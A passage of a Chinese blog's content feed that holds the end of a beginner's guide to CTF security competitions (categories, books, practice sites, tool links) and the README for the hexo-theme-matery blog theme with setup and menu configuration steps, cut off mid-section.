id="MISC（安全杂项）："><a href="#MISC（安全杂项）：" class="headerlink" title="MISC（安全杂项）："></a>MISC（安全杂项）：</h4><p>全称Miscellaneous。题目涉及流量分析、电子取证、人肉搜索、数据分析、大数据统计等等，覆盖面比较广。我们平时看到的社工类题目；给你一个流量包让你分析的题目；取证分析题目，都属于这类题目。主要考查参赛选手的各种基础综合知识，考察范围比较广。</p><h4 id="STEGA（隐写）："><a href="#STEGA（隐写）：" class="headerlink" title="STEGA（隐写）："></a>STEGA（隐写）：</h4><p>全称Steganography。隐写术是我开始接触CTF觉得比较神奇的一类，知道这个东西的时候感觉好神奇啊，黑客们真是聪明。题目的Flag会隐藏到图片、音频、视频等各类数据载体中供参赛选手获取。载体就是图片、音频、视频等，可能是修改了这些载体来隐藏flag，也可能将flag隐藏在这些载体的二进制空白位置。有时候需要你侦探精神足够的强，才能发现。此类题目主要考查参赛选手的对各种隐写工具、隐写算法的熟悉程度。实验吧“角斗场”的隐写题目在我看来是比较全的，以上说到的都有涵盖。新手盆友们可以去了解下。</p><h4 id="PPC（编程类）："><a href="#PPC（编程类）：" class="headerlink" title="PPC（编程类）："></a>PPC（编程类）：</h4><p>全称Professionally Program Coder。题目涉及到程序编写、编程算法实现。算法的逆向编写，批量处理等，有时候用编程去处理问题，会方便的多。当然PPC相比ACM来说，还是较为容易的。至于编程语言嘛，推荐使用Python来尝试。这部分主要考察选手的快速编程能力。</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20191225150025.png" alt="img"></p><h2 id="学之前的思考：分析赛题情况"><a href="#学之前的思考：分析赛题情况" class="headerlink" title="学之前的思考：分析赛题情况"></a>学之前的思考：分析赛题情况</h2><p><strong>PWN、Reserve偏重对汇编、逆向的理解</strong></p><p><strong>Crypto偏重对数学、算法的深入学习</strong></p><p><strong>Web编程对技巧沉淀、快速搜索能力的挑战</strong></p><p><strong>Misc则更为复杂，所有与计算机安全挑战有关的都算在其中</strong></p><h3 id="常规做法"><a href="#常规做法" class="headerlink" title="常规做法"></a>常规做法</h3><blockquote><h5 id="A方向：PWN-Reserver-Crypto随机搭配"><a href="#A方向：PWN-Reserver-Crypto随机搭配" class="headerlink" title="A方向：PWN+Reserver+Crypto随机搭配"></a>A方向：PWN+Reserver+Crypto随机搭配</h5><h5 id="B方向：Web-Misc-Crypto组合"><a href="#B方向：Web-Misc-Crypto组合" class="headerlink" title="B方向：Web+Misc+Crypto组合"></a>B方向：Web+Misc+Crypto组合</h5></blockquote><p><strong>其实Misc所有人都可以做</strong><br><strong>恶补基础知识&amp;信息安全专业知识</strong></p><h3 id="推荐图书"><a href="#推荐图书" class="headerlink" title="推荐图书"></a>推荐图书</h3><h4 id="A方向："><a href="#A方向：" class="headerlink" title="A方向："></a><strong>A方向：</strong></h4><p>RE for Beginners（逆向工程入门）</p><p>IDA Pro权威指南</p><p>揭秘家庭路由器0day漏洞挖掘技术</p><p>自己动手写操作系统</p><p>黑客攻防宝典：系统实战篇</p><h4 id="B方向："><a href="#B方向：" class="headerlink" title="B方向："></a><strong>B方向：</strong></h4><p>Web应用安全权威指南</p><p>Web前端黑客技术揭秘</p><p>黑客秘籍——渗透测试使用指南</p><p>黑客攻防宝典WEB实战篇</p><p>代码审计：企业级Web代码安全架构<br>从基础题目出发</p><h2 id="CTF入门介绍"><a href="#CTF入门介绍" class="headerlink" title="CTF入门介绍"></a>CTF入门介绍</h2><h4 id="入门需要哪些基础"><a href="#入门需要哪些基础" class="headerlink" title="入门需要哪些基础"></a>入门需要哪些基础</h4><p>1.编程语言基础（c、汇编、脚本语言）<br>2.数学基础（算法、密码学）<br>3.脑洞大开（天马行空的想象、推理解密）<br>4.体力耐力（通宵熬夜）</p><h4 id="到底如何学？"><a href="#到底如何学？" class="headerlink" title="到底如何学？"></a>到底如何学？</h4><p>1.分析赛题情况<br>2.分析自身能力 自己最适合哪个方向<br>3.选择更适合的入手</p><h4 id="分析赛题"><a href="#分析赛题" class="headerlink" title="分析赛题"></a>分析赛题</h4><p>PWN、Reverse偏重对汇编、逆向的理解 对底层理解<br>Crypto偏重对数学、算法的深入学习 密码课要深入学<br>Web偏重对技巧沉淀、快速搜索能力的挑战 发散思维，对底层只需要了解，代码原理，关于漏洞点的积累<br>Misc则更复杂，所有与计算机安全挑战有关的都在其中 隐写，图片数据分析还原，流量，大数据，对游戏分析逆向</p><h4 id="常规做法："><a href="#常规做法：" class="headerlink" title="常规做法："></a>常规做法：</h4><p>A方向：PWN+Reverse+Crypto随机搭配<br>B方向：Web+Misc组合<br>Misc所有人都可以做</p><h4 id="入门知识："><a href="#入门知识：" class="headerlink" title="入门知识："></a>入门知识：</h4><p>都要学的内容：linux基础、计算机组成原理、操作系统原理、网络协议分析</p><p>A方向：IDA工具使用（fs插件）、逆向工程、密码学、缓冲区溢出等<br>B方向：Web安全、网络安全、内网渗透、数据库安全等 前10的安全漏洞</p><h4 id="入门–以练促赛，以赛养练"><a href="#入门–以练促赛，以赛养练" class="headerlink" title="入门–以练促赛，以赛养练"></a>入门–以练促赛，以赛养练</h4><p>选择一场已经存在writeup的比赛</p><p>总结解题过程，分析出题人想法</p><p>参加一场最新的ctf比赛<br>https：//ctftime.org/ 国际比赛，有很多基础的<br>http：//<a href="http://www.xctf.org.cn/" target="_blank" rel="noopener">www.xctf.org.cn/</a> 国内比赛，比较难</p><h4 id="组建团队—强力成员画像"><a href="#组建团队—强力成员画像" class="headerlink" title="组建团队—强力成员画像"></a><strong>组建团队—强力成员画像</strong></h4><p>1.思维跳跃：灵活性，不会钻墙脚<br>2.专注：遇到问题不放弃直到解决<br>3.耐力：连续一天研究技术<br>4.团队精神：责任、凝聚、分享</p><p>有3条为强力成员，有4条会成为强力队长！</p><h4 id="组队问题："><a href="#组队问题：" class="headerlink" title="组队问题："></a><strong>组队问题：</strong></h4><p>新人招募、队员培养、梯队有序、纪律严格</p><h2 id="CTF方向入门指南"><a href="#CTF方向入门指南" class="headerlink" title="CTF方向入门指南"></a>CTF方向入门指南</h2><ul><li><h3 id="web："><a href="#web：" class="headerlink" title="web："></a>web：</h3><p>1：先去大概了解一下html，php和sql的相关知识，熟悉一下语言。推荐W3cschool<br>2：了解http包的组成部分<br>2：接着你需要一个可以抓包的工具（Burpsuite）工具自行百度，需要JAVA环境。<br>3：当然，浏览器也很重要，这里推荐web狗专用firefox浏览器，保证你用了之后题题出flag！（火狐需要自行下载插件，这五个插件用的比较多可以自己去下载1.Firebug<br>2.Hackbar 3.HostAdmin 4.UserAgent Switcher 5.Modify Headers（工具使用方法可以先自己百度下）<br>4：现在就需要一个可以编辑和看代码的软件,一个是Notpad,一个是Sublime,根据喜好自行选择。</p></li><li><h3 id="逆向："><a href="#逆向：" class="headerlink" title="逆向："></a>逆向：</h3><p> <strong>逆向我也懂的不多，说说我觉得重要的吧，仅供参考：</strong></p><p>1.首先的首先必须得掌握基本的编程能力，之后就是学习相对底层的【汇编语言】<br>2.对不同的调试工具例如windbg，ollydbg，ida熟练的调试与使用（逻辑思维能力要强）<br>3.掌握外壳原理和技巧，遇到加密程序时能进行脱壳与解密处理（学长讲的的汇编题就属于解密）<br>4.经常逛各大论坛：吾爱破解，看雪论坛，发现新姿势<br>这里推荐吾爱破解的入门教程：<a href="https://www.52pojie.cn/thread-349073-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-349073-1-1.html</a></p></li><li><h3 id="pwn（最难的部分）："><a href="#pwn（最难的部分）：" class="headerlink" title="pwn（最难的部分）："></a>pwn（最难的部分）：</h3><p>1.shell的基本语法<br>2.kali下各种渗透工具的使用<br>3.熟练掌握逆向方面的知识<br>4.不断的摸索…（我也不知道接下来该怎么办…）</p></li><li><h3 id="misc：-无限的脑洞！分为很多类隐写："><a href="#misc：-无限的脑洞！分为很多类隐写：" class="headerlink" title="misc： 无限的脑洞！分为很多类隐写："></a>misc： 无限的脑洞！分为很多类隐写：</h3><p>1.图片隐写：stegsolve对图片进行分析，winhex找隐藏信息，lsb隐写，ntfs文件流，图种，二维码等等等等…<br>2.音频隐写：mp3stego分离MP3中的隐藏文件，audacity分析等等等等…<br>3.压缩包隐写：伪加密，明文攻击，暴力破解等等等等…<br>4…等等…</p></li><li><h3 id="密码学（其实并不难）："><a href="#密码学（其实并不难）：" class="headerlink" title="密码学（其实并不难）："></a>密码学（其实并不难）：</h3><p>1.阅读各种加密模式，查阅资料，掌握加密原理<br>2.能快速识别各种加密的特征</p></li></ul><h2 id="CTF靶场介绍"><a href="#CTF靶场介绍" class="headerlink" title="CTF靶场介绍"></a>CTF靶场介绍</h2><p>i春秋训练平台：<a href="https://www.ichunqiu.com/battalion" target="_blank" rel="noopener">https://www.ichunqiu.com/battalion</a></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20191225151953.png" alt></p><p>buuctf (北京联合大学):<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20191225153455.png" alt></p><p>攻防世界 :<a href="https://adworld.xctf.org.cn/task" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task</a></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20191225153919.png" alt></p><p>bugku ：<a href="https://ctf.bugku.com/challenges" target="_blank" rel="noopener">https://ctf.bugku.com/challenges</a></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20191225154244.png" alt></p><p><a href="http://overthewire.org/wargames/" target="_blank" rel="noopener">http://overthewire.org/wargames/</a></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20191225152130.png" alt></p><p>We Chall:   <a href="http://www.wechall.net/sites.php" target="_blank" rel="noopener">http://www.wechall.net/sites.php</a></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20191225152314.png" alt></p><p>很炫酷游戏化————<a href="https://microcorruption.com/login" target="_blank" rel="noopener">https://microcorruption.com/login</a></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20191225152505.png" alt></p><p><a href="https://exploit-exercises.com/**（A方向）" target="_blank" rel="noopener">https://exploit-exercises.com/**（A方向）</a>**</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20191225152537.png" alt="img"></p><h2 id="工具集："><a href="#工具集：" class="headerlink" title="工具集："></a>工具集：</h2><p><a href="https://github.com/P1kachu/v0lt" target="_blank" rel="noopener">https://github.com/P1kachu/v0lt</a></p><p><a href="https://github.com/truongkma/ctf-tools" target="_blank" rel="noopener">https://github.com/truongkma/ctf-tools</a></p><p><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF简介 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matery使用指南</title>
      <link href="/2019/12/17/readme-cn/"/>
      <url>/2019/12/17/readme-cn/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo-theme-matery"><a href="#hexo-theme-matery" class="headerlink" title="hexo-theme-matery"></a>hexo-theme-matery</h1><p><a href="http://hits.dwyl.io/blinkfox/hexo-theme-matery" target="_blank" rel="noopener"><img src="http://hits.dwyl.io/blinkfox/hexo-theme-matery.svg" alt="HitCount"></a> <a href="https://gitter.im/hexo-theme-matery/Lobby?utm_source=badge" target="_blank" rel="noopener"><img src="https://img.shields.io/gitter/room/blinkfox/hexo-theme-matery.svg" alt="Gitter"></a> <a href="https://github.com/blinkfox/hexo-theme-matery/issues" target="_blank" rel="noopener"><img src="https://img.shields.io/github/issues/blinkfox/hexo-theme-matery.svg" alt="GitHub issues"></a> <a href="https://github.com/blinkfox/hexo-theme-matery/blob/master/LICENSE" target="_blank" rel="noopener"><img src="https://img.shields.io/github/license/blinkfox/hexo-theme-matery.svg" alt="GitHub license"></a> <a href="https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master" target="_blank" rel="noopener"><img src="https://img.shields.io/badge/downloads-master-green.svg" alt="Download"></a> <a href="http://hexo.io" target="_blank" rel="noopener"><img src="https://img.shields.io/badge/hexo-%3E%3D%203.0-blue.svg" alt="Hexo Version"></a> <a href="https://github.com/blinkfox/hexo-theme-matery/network" target="_blank" rel="noopener"><img src="https://img.shields.io/github/forks/blinkfox/hexo-theme-matery.svg" alt="GitHub forks"></a> <a href="https://github.com/blinkfox/hexo-theme-matery/stargazers" target="_blank" rel="noopener"><img src="https://img.shields.io/github/stars/blinkfox/hexo-theme-matery.svg" alt="GitHub stars"></a></p><p><a href="README.md">🇺🇸English Document</a> | <a href="https://blinkfox.github.io/" target="_blank" rel="noopener">演示示例</a> | QQ 交流群1（已满）: <a href="https://jq.qq.com/?_wv=1027&k=5zMDYHT" target="_blank" rel="noopener"><code>926552981</code></a> | QQ 交流群2（推荐）: <a href="https://jq.qq.com/?_wv=1027&k=53q2Ayp" target="_blank" rel="noopener"><code>971887688</code></a></p><blockquote><p>这是一个采用 <code>Material Design</code> 和响应式设计的 Hexo 博客主题。</p></blockquote><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li>简单漂亮，文章内容美观易读</li><li><a href="https://material.io/" target="_blank" rel="noopener">Material Design</a> 设计</li><li>响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现</li><li>首页轮播文章及每天动态切换 <code>Banner</code> 图片</li><li>瀑布流式的博客文章列表（文章无特色图片时会有 <code>24</code> 张漂亮的图片代替）</li><li>时间轴式的归档页</li><li><strong>词云</strong>的标签页和<strong>雷达图</strong>的分类页</li><li>丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）</li><li>可自定义的数据的友情链接页面</li><li>支持文章置顶和文章打赏</li><li>支持 <code>MathJax</code></li><li><code>TOC</code> 目录</li><li>可设置复制文章内容时追加版权信息</li><li>可设置阅读文章时做密码验证</li><li><a href="https://gitalk.github.io/" target="_blank" rel="noopener">Gitalk</a>、<a href="https://imsun.github.io/gitment/" target="_blank" rel="noopener">Gitment</a>、<a href="https://valine.js.org/" target="_blank" rel="noopener">Valine</a> 和 <a href="https://disqus.com/" target="_blank" rel="noopener">Disqus</a> 评论模块（推荐使用 <code>Gitalk</code>）</li><li>集成了<a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">不蒜子统计</a>、谷歌分析（<code>Google Analytics</code>）和文章字数统计等功能</li><li>支持在首页的音乐播放和视频播放功能</li><li>支持<code>emoji</code>表情，用<code>markdown emoji</code>语法书写直接生成对应的能<strong>跳跃</strong>的表情。</li><li>支持 <a href="http://www.daovoice.io/" target="_blank" rel="noopener">DaoVoice</a>、<a href="https://www.tidio.com/" target="_blank" rel="noopener">Tidio</a> 在线聊天功能。</li></ul><h2 id="贡献者"><a href="#贡献者" class="headerlink" title="贡献者"></a>贡献者</h2><p>感谢下面列出的贡献者，没有他们，hexo-theme-matery 不会这么完美。</p><ul><li><a href="https://github.com/HarborZeng" target="_blank" rel="noopener">@HarborZeng</a></li><li><a href="https://github.com/shw2018" target="_blank" rel="noopener">@shw2018</a></li><li><a href="https://github.com/L1cardo" target="_blank" rel="noopener">@L1cardo</a></li><li><a href="https://github.com/Five-great" target="_blank" rel="noopener">@Five-great</a></li></ul><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>当你看到这里的时候，应该已经有一个自己的 <a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">Hexo</a> 博客了。如果还没有的话，不妨使用 Hexo 和 <a href="https://www.appinn.com/markdown/" target="_blank" rel="noopener">Markdown</a> 来写博客和文章。</p><p>点击 <a href="https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master" target="_blank" rel="noopener">这里</a> 下载 <code>master</code> 分支的最新稳定版的代码，解压缩后，将 <code>hexo-theme-matery</code> 的文件夹复制到你 Hexo 的 <code>themes</code> 文件夹中即可。</p><p>当然你也可以在你的 <code>themes</code> 文件夹下使用 <code>Git clone</code> 命令来下载:</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/blinkfox/hexo-theme-matery.git</code></pre><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h3><p>修改 Hexo 根目录下的 <code>_config.yml</code> 的  <code>theme</code> 的值：<code>theme: hexo-theme-matery</code></p><h4 id="config-yml-文件的其它修改建议"><a href="#config-yml-文件的其它修改建议" class="headerlink" title="_config.yml 文件的其它修改建议:"></a><code>_config.yml</code> 文件的其它修改建议:</h4><ul><li>请修改 <code>_config.yml</code> 的 <code>url</code> 的值为你的网站主 <code>URL</code>（如：<code>http://xxx.github.io</code>）。</li><li>建议修改两个 <code>per_page</code> 的分页条数值为 <code>6</code> 的倍数，如：<code>12</code>、<code>18</code> 等，这样文章列表在各个屏幕下都能较好的显示。</li><li>如果你是中文用户，则建议修改 <code>language</code> 的值为 <code>zh-CN</code>。</li></ul><h3 id="新建分类-categories-页"><a href="#新建分类-categories-页" class="headerlink" title="新建分类 categories 页"></a>新建分类 categories 页</h3><p><code>categories</code> 页是用来展示所有分类的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>categories/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class=" language-bash"><code class="language-bash">hexo new page <span class="token string">"categories"</span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/categories/index.md</code>，至少需要以下内容：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> categories<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 17:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"categories"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"categories"</span><span class="token punctuation">---</span></code></pre><h3 id="新建标签-tags-页"><a href="#新建标签-tags-页" class="headerlink" title="新建标签 tags 页"></a>新建标签 tags 页</h3><p><code>tags</code> 页是用来展示所有标签的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>tags/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class=" language-bash"><code class="language-bash">hexo new page <span class="token string">"tags"</span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/tags/index.md</code>，至少需要以下内容：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> tags<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 18:23:38</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"tags"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"tags"</span><span class="token punctuation">---</span></code></pre><h3 id="新建关于我-about-页"><a href="#新建关于我-about-页" class="headerlink" title="新建关于我 about 页"></a>新建关于我 about 页</h3><p><code>about</code> 页是用来展示<strong>关于我和我的博客</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>about/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class=" language-bash"><code class="language-bash">hexo new page <span class="token string">"about"</span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/about/index.md</code>，至少需要以下内容：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> about<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 17:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"about"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"about"</span><span class="token punctuation">---</span></code></pre><h3 id="新建留言板-contact-页（可选的）"><a href="#新建留言板-contact-页（可选的）" class="headerlink" title="新建留言板 contact 页（可选的）"></a>新建留言板 contact 页（可选的）</h3><p><code>contact</code> 页是用来展示<strong>留言板</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>contact/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class=" language-bash"><code class="language-bash">hexo new page <span class="token string">"contact"</span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/contact/index.md</code>，至少需要以下内容：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> contact<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 17:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"contact"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"contact"</span><span class="token punctuation">---</span></code></pre><blockquote><p><strong>注</strong>：本留言板功能依赖于第三方评论系统，请<strong>激活</strong>你的评论系统才有效果。并且在主题的 <code>_config.yml</code> 文件中，第 <code>19</code> 至 <code>21</code> 行的“<strong>菜单</strong>”配置，取消关于留言板的注释即可。</p></blockquote><h3 id="新建友情连接-friends-页（可选的）"><a href="#新建友情连接-friends-页（可选的）" class="headerlink" title="新建友情连接 friends 页（可选的）"></a>新建友情连接 friends 页（可选的）</h3><p><code>friends</code> 页是用来展示<strong>友情连接</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>friends/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class=" language-bash"><code class="language-bash">hexo new page <span class="token string">"friends"</span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/friends/index.md</code>，至少需要以下内容：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> friends<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-12-12 21:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"friends"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"friends"</span><span class="token punctuation">---</span></code></pre><p>同时，在你的博客 <code>source</code> 目录下新建 <code>_data</code> 目录，在 <code>_data</code> 目录中新建 <code>friends.json</code> 文件，文件内容如下所示：</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">[</span><span class="token punctuation">{</span>    <span class="token property">"avatar"</span><span class="token operator">:</span> <span class="token string">"http://image.luokangyuan.com/1_qq_27922023.jpg"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"码酱"</span><span class="token punctuation">,</span>    <span class="token property">"introduction"</span><span class="token operator">:</span> <span class="token string">"我不是大佬，只是在追寻大佬的脚步"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://luokangyuan.com/"</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"前去学习"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token property">"avatar"</span><span class="token operator">:</span> <span class="token string">"http://image.luokangyuan.com/4027734.jpeg"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"闪烁之狐"</span><span class="token punctuation">,</span>    <span class="token property">"introduction"</span><span class="token operator">:</span> <span class="token string">"编程界大佬，技术牛，人还特别好，不懂的都可以请教大佬"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://blinkfox.github.io/"</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"前去学习"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token property">"avatar"</span><span class="token operator">:</span> <span class="token string">"http://image.luokangyuan.com/avatar.jpg"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"ja_rome"</span><span class="token punctuation">,</span>    <span class="token property">"introduction"</span><span class="token operator">:</span> <span class="token string">"平凡的脚步也可以走出伟大的行程"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://me.csdn.net/jlh912008548"</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"前去学习"</span><span class="token punctuation">}</span><span class="token punctuation">]</span></code></pre><h3 id="菜单导航配置"><a href="#菜单导航配置" class="headerlink" title="菜单导航配置"></a>菜单导航配置</h3><h4 id="配置基本菜单导航的名称、路径url和图标icon"><a href="#配置基本菜单导航的名称、路径url和图标icon" class="headerlink" title="配置基本菜单导航的名称、路径url和图标icon."></a>配置基本菜单导航的名称、路径url和图标icon.</h4><p>1.菜单导航名称可以是中文也可以是英文(如：<code>Index</code>或<code>主页</code>)<br>2.图标icon 可以在<a href="https://fontawesome.com/icons" target="_blank" rel="noopener">Font Awesome</a> 中查找   </p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">menu</span><span class="token punctuation">:</span>  <span class="token key atrule">Index</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>home  <span class="token key atrule">Tags</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /tags    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>tags  <span class="token key atrule">Categories</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /categories    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>bookmark  <span class="token key atrule">Archives</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /archives    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>archive  <span class="token key atrule">About</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /about    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>user<span class="token punctuation">-</span>circle  <span class="token key atrule">Friends</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /friends    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>address<span class="token punctuation">-</span>book</code></pre><h4 id="二级菜单配置方法"><a href="#二级菜单配置方法" class="headerlink" title="二级菜单配置方法"></a>二级菜单配置方法</h4><p>如果你需要二级菜单则可以在原基本菜单导航的基础上如下操作<br>1.在需要添加二级菜单的一级菜单下添加<code>children</code>关键字(如:<code>About</code>菜单下添加<code>children</code>)<br>2.在<code>children</code>下创建二级菜单的 名称name,路径url和图标icon.<br>3.注意每个二级菜单模块前要加 <code>-</code>.<br>4.注意缩进格式  </p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">menu</span><span class="token punctuation">:</span>  <span class="token key atrule">Index</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>home  <span class="token key atrule">Tags</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /tags    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>tags  <span class="token key atrule">Categories</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /categories    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>bookmark  <span class="token key atrule">Archives</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /archives    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>archive  <span class="token key atrule">About</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /about    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>user<span class="token punctuation">-</span>circle<span class="token punctuation">-</span>o  <span class="token key atrule">Friends</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /friends    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>address<span class="token punctuation">-</span>book  <span class="token key atrule">Medias</span><span class="token punctuation">:</span>    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>list    <span class="token key atrule">children</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Musics        <span class="token key atrule">url</span><span class="token punctuation">:</span> /musics        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>music      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Movies        <span class="token key atrule">url</span><span class="token punctuation">:</span> /movies        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>film      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Books        <span class="token key atrule">url</span><span class="token punctuation">:</span> /books        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>book      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Galleries        <span class="token key atrule">url</span><span class="token punctuation">:</span> /galleries        <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>image</code></pre><p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后就可以在文章中对应位置看到你用<code>emoji</code>语法写的表情了。</p><h3 id="代码高亮"><a href="#代码高亮" class="headerlink" 